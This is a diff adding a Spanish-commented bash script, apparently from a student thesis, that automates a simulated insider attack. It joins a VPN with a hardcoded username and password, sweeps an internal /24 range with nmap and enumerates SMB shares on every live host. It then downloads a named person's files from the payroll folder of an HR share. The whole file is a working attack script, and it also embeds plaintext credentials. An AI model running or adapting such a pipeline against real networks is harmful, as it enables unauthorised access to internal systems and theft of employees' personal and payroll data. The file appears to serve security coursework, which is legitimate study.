@@ -1,1 +1,34 @@
+#!/bin/bash
+#
+# ByteCat - Attack Automation Pipeline
+# Simula fases del ataque interno
+# Autor: Noemí Fernández (TFG 2026)
+#
+
+VPN_PROFILE="sergio.ovpn"
+USER="sergio"
+PASS="SergioPassword!"   # en producción se sustituiría por variable segura
+TARGET_RANGE="192.168.20.0/24"
+
+echo "=== ByteCat - Attack Automation Pipeline ==="
+
+echo "[1] Estableciendo conexión VPN..."
+sudo openvpn --config $VPN_PROFILE --auth-user-pass <(printf "%s\n%s\n" "$USER" "$PASS") --daemon
+sleep 5
+
+echo "[2] Enumerando red interna..."
+nmap -sn $TARGET_RANGE -oG hosts.txt
+cat hosts.txt | grep Up
+
+echo "[3] Enumeración de SMB..."
+while read host; do
+    IP=$(echo $host | awk '{print $2}')
+    echo " * Probing SMB on $IP"
+    smbclient -L //$IP -U "$USER%$PASS" 2>/dev/null | grep Disk
+done<<<"$(grep Up hosts.txt)"
+
+echo "[4] Accediendo al recurso RRHH..."
+smbclient //192.168.20.4/rrhh-share -U "$USER%$PASS" -c "cd 01_NOMINAS/2026/05_MAYO/Sergio; mget *"
+
+echo "[5] Finalizado. Archivos descargados."
 
